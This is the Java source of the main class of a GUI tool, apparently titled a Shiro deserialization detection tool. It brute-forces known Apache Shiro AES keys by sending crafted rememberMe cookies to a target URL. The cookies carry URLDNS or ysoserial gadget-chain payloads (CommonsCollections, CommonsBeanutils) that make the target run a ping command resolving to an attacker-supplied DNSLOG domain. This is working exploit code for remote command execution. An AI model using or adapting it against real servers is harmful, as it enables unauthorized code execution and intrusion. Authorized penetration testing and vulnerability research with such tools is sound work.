package com.fuping;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.concurrent.Service;
import javafx.concurrent.Task;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;
import net.sf.json.JSONObject;
import org.apache.http.HttpResponse;
import sun.misc.BASE64Decoder;
import ysoserial.payloads.ObjectPayload;



public class MainApp extends Application {


    
    private TextField textField_url;
    private String url;


    private TextArea textAreaKeys;
    private RadioButton radioBtnDefault;
    private RadioButton radioButtonCustom;
    private RadioButton radioBtnURLDNS;
    private RadioButton radioBtnPayload;
    private boolean isURLDNSCheck = true;
    private TextField textField_DNSURL;
    private TextArea textAreaResult;
    private Button startBtn;
    private Button stopBtn;
    private String check_keys = "";
    private String domainCookie;
    private boolean radioCustom = true;

    private volatile Service<String> service;
    @Override
    public void start(Stage primaryStage) throws Exception {
        // TODO Auto-generated method stub

        AnchorPane rootLayout = new AnchorPane();
        Scene scene = new Scene(rootLayout,740,480);
        Label label_URL = new Label("URL:");
        label_URL.setLayoutX(39);
        label_URL.setLayoutY(27);
        label_URL.setPrefSize(43,23);

        textField_url = new TextField("http://127.0.0.1:8090/shiro_war/");
        textField_url.setLayoutX(88);
        textField_url.setLayoutY(25);
        textField_url.setPrefSize(383,23);
        startBtn= createButton("开始检测",500,25,86,27);
        stopBtn = createButton("停止",600,25,86,27);



        Label keyLabel= createLabel("Key列表",100,100,50,17);

        final ToggleGroup toggleGroup_dnsLog = new ToggleGroup();
        radioBtnDefault= createRadioButton("默认DNSLOG",316,100,165,17.5);
        radioButtonCustom = createRadioButton("自定义DNSLOG",500,100,165,17.5);


        for (String s:Util.KEYS) check_keys += s + "\r\n";
        textAreaKeys = createTextArea(check_keys,34,130,235,282);
        final ToggleGroup toggleGroup_checkMethod = new ToggleGroup();
        radioBtnURLDNS= createRadioButton("使用URLDNS",316,130,165,17.5);
        radioBtnPayload= createRadioButton("使用Payloads",500,130,165,17.5);
        radioBtnURLDNS.setToggleGroup(toggleGroup_checkMethod);
        radioBtnURLDNS.setSelected(true);
        radioBtnPayload.setToggleGroup(toggleGroup_checkMethod);
        Label dnsURLLabel = createLabel("DNSURL:",316,170,53,17);
        textField_DNSURL = createTextFiled(null,380,170,331,27);
//        Label resultLabel = createLabel("结果",440,83,50,17);

        textAreaResult = createTextArea("请去自定义的DNSLOG平台查看结果",316,210,395,200);


        radioBtnDefault.setToggleGroup(toggleGroup_dnsLog);
        radioButtonCustom.setToggleGroup(toggleGroup_dnsLog);
        radioButtonCustom.setSelected(true);
        textField_DNSURL.setEditable(true);
        stopBtn.setDisable(true);
        radioBtnDefault.setOnAction(event -> {
            radioCustom = false;
            textField_DNSURL.clear();

            textField_DNSURL.setEditable(false);
            textAreaResult.clear();;
            JSONObject domainJSON = UtilMethod.getDomain();

            if(domainJSON != null){
                Platform.runLater(() ->{
                    textField_DNSURL.setText(domainJSON.getString("domain"));
                });

                domainCookie = domainJSON.getString("Cookie");
            }
            textAreaResult.textProperty().unbind();
            textAreaResult.clear();


        });
        radioButtonCustom.setOnAction(event -> {
            radioCustom = true;
            textField_DNSURL.clear();
            textField_DNSURL.setEditable(true);

            textAreaResult.textProperty().unbind();
            textAreaResult.clear();
            textAreaResult.setText("请去自定义的DNSLOG平台查看结果");
        });

        radioBtnURLDNS.setOnAction(event -> {//使用URLDNS检测
            isURLDNSCheck = true;
        });
        radioBtnPayload.setOnAction(event -> {//使用Payload检测
            isURLDNSCheck = false;
        });


//        Service<String> service;
        stopBtn.setOnAction(event -> {
            if(service!=null){
                service.cancel();
            }
        });

        startBtn.setOnAction(event -> {

            if(textField_url.getText().trim().equals("")){
                showAlert(Alert.AlertType.WARNING, "警告", "检测网址不能为空!");
                return;
            }
            if(textField_DNSURL.getText() == null || textAreaKeys.getText()==null){
                showAlert(Alert.AlertType.WARNING, "警告", "检测的keys和dnslog不能为空");
                return;
            }
            if(!textField_DNSURL.getText().trim().equals("") && !textAreaKeys.getText().trim().equals("")){
                radioButtonCustom.setDisable(true);
                radioBtnDefault.setDisable(true);
                radioBtnPayload.setDisable(true);
                radioBtnURLDNS.setDisable(true);
                startBtn.setDisable(true);
                stopBtn.setDisable(false);
                url = textField_url.getText().trim();
                String checkKeyStr = textAreaKeys.getText();

                String dnsDomain = textField_DNSURL.getText();
                dnsDomain = dnsDomain.replaceAll("https://","").replaceAll("http://","");

                String keys[] = checkKeyStr.split("\n");

                String finalDnsDomain = dnsDomain;


                service=new Service<String>() {

                    @Override
                    protected Task<String> createTask() {
                        return new Task<String>() {
                            StringBuilder sb = new StringBuilder();;
                            @Override
                            protected String call() {

                                for (String key : keys) {
                                    if(isCancelled()){
                                        break;
                                    }
                                    byte[] bytes;
                                    try {
                                        if(isURLDNSCheck){
                                            bytes = URLDNSCheck.makeDNSURL(key + "." + finalDnsDomain);
                                            String rememberMe = (ShiroAESCrypto.encrypt(bytes, new BASE64Decoder().decodeBuffer(key))).replaceAll("\n", "");//.replaceAll("\\+","%2b");;
                                            String cookie = "rememberMe=" + rememberMe+";";
                                            HttpResponse response = UtilMethod.doHttpRequest(url,cookie);

                                            if(response != null){
                                                if (response.getStatusLine().getStatusCode() == 200) {
                                                    sb.append("send ").append(key).append("\tok");
                                                } else {
                                                    sb.append("send ").append(key).append("\tfailed");
                                                }
                                            }else{
                                                sb.append("send ").append(key).append("\terror");
                                            }
                                        }else{
                                            String classNames[] = {"CommonsBeanutils1",
                                                    "CommonsCollections1",
                                                    "CommonsCollections2",
                                                    "CommonsCollections3",
                                                    "CommonsCollections4",
                                                    "CommonsCollections5", //"CommonsCollections55",
                                                    "CommonsCollections6",
                                                    "CommonsCollections8",
                                                    "CommonsCollections10"};

                                            sb.append("key:");
                                            sb.append(key);
                                            sb.append("\n");
                                            for(String tt:classNames){

                                                String className = "ysoserial.payloads." + tt;
                                                String codeCommand = "ping "+key.substring(0,3)+"."+tt+"."+finalDnsDomain;
                                                ObjectPayload objectPayload = (ObjectPayload) Class.forName(className).newInstance();
                                                byte[] ser = Serializer.serialize(objectPayload.getObject(codeCommand));
                                                String remember = (ShiroAESCrypto.encrypt(ser,new BASE64Decoder().decodeBuffer(key))).replaceAll("\n","");//.replaceAll("\\+","%2b");;
                                                String cookie = "rememberMe="+remember+";";
                                                HttpResponse response = UtilMethod.doHttpRequest(url,cookie);

                                                if(response != null){
                                                    if (response.getStatusLine().getStatusCode() == 200) {
                                                        sb.append("send ").append(tt).append("\tok");
                                                    } else {
                                                        sb.append("send ").append(tt).append("\tfailed");
                                                    }
                                                }else{
                                                    sb.append("send ").append(tt).append("\terror");
                                                }
                                                sb.append("\n");
                                            }
                                        }
                                        

                                        sb.append("\r\n");

                                    }catch (Exception e){

                                        sb.append("send ").append(key).append("\terror");
                                        sb.append("\r\n");
                                    }
                                    updateValue(sb.toString());
                                }
                                sb.append("-------------------------------------");
                                sb.append("\r\n");
                                if(radioCustom){
                                    sb.append("请到DNSLOG平台\"").append(finalDnsDomain).append("\"查看结果");
                                }else{
                                    sb.append(UtilMethod.getRecords(domainCookie));
                                }

                                sb.append("\r\n");
                                updateValue(sb.toString());
                                return sb.toString();
                            }
                        };
                    }
                };
                service.start();
                textAreaResult.textProperty().bind(service.valueProperty());
                service.setOnSucceeded(e -> {
                    radioButtonCustom.setDisable(false);
                    radioBtnDefault.setDisable(false);
                    startBtn.setDisable(false);
                    radioBtnPayload.setDisable(false);
                    radioBtnURLDNS.setDisable(false);
                    stopBtn.setDisable(true);
                });
                service.setOnCancelled(e -> {
                    radioButtonCustom.setDisable(false);
                    radioBtnDefault.setDisable(false);
                    startBtn.setDisable(false);
                    radioBtnPayload.setDisable(false);
                    radioBtnURLDNS.setDisable(false);
                    stopBtn.setDisable(true);
                });



            }else{
                showAlert(Alert.AlertType.WARNING, "警告", "检测的keys和dnslog不能为空");
                return;
            }


        });

        rootLayout.getChildren().addAll( label_URL,textField_url,keyLabel,radioBtnDefault,radioButtonCustom,startBtn,
                stopBtn,radioBtnURLDNS,radioBtnPayload,
                textAreaKeys,dnsURLLabel,textField_DNSURL,textAreaResult);

        primaryStage.setScene(scene);
        primaryStage.setTitle("Shiro反序列化检测工具");
        primaryStage.setResizable(false);

        primaryStage.setOnCloseRequest(event -> System.exit(0));
        primaryStage.show();
    }


    public static void main(String[] args) {

        launch(args);
    }

    private Label createLabel(String text, double x, double y, double preW, double preH){
        Label l = new Label(text);
        l.setPrefSize(preW,preH);
        l.setLayoutX(x);
        l.setLayoutY(y);
        return l;
    }

    private TextField createTextFiled(String text, double x, double y, double preW, double preH){
        TextField textField = new TextField(text);
        textField.setPrefSize(preW,preH);
        textField.setLayoutX(x);
        textField.setLayoutY(y);
        return textField;
    }

    private Button createButton(String text, double x, double y, double preW, double preH){
        Button button = new Button(text);
        button.setPrefSize(preW,preH);
        button.setLayoutX(x);
        button.setLayoutY(y);
        return button;
    }


    private TextArea createTextArea(String text, double x, double y, double preW, double preH){
        TextArea textArea = new TextArea();
        textArea.setPrefSize(preW,preH);
        textArea.setLayoutX(x);
        textArea.setText(text);
        textArea.setLayoutY(y);
        return  textArea;
    }

    private RadioButton createRadioButton(String text, double x, double y, double preW, double preH){
        RadioButton radioButton = new RadioButton();
        radioButton.setPrefSize(preW,preH);
        radioButton.setLayoutX(x);
        radioButton.setText(text);
        radioButton.setLayoutY(y);
        return radioButton;
    }

    private void showAlert(Alert.AlertType type, String title, String message) {
        Alert alert = new Alert(type);
        alert.setTitle(title);
        alert.setHeaderText(null);
        alert.setContentText(message);
        alert.showAndWait();
    }

}
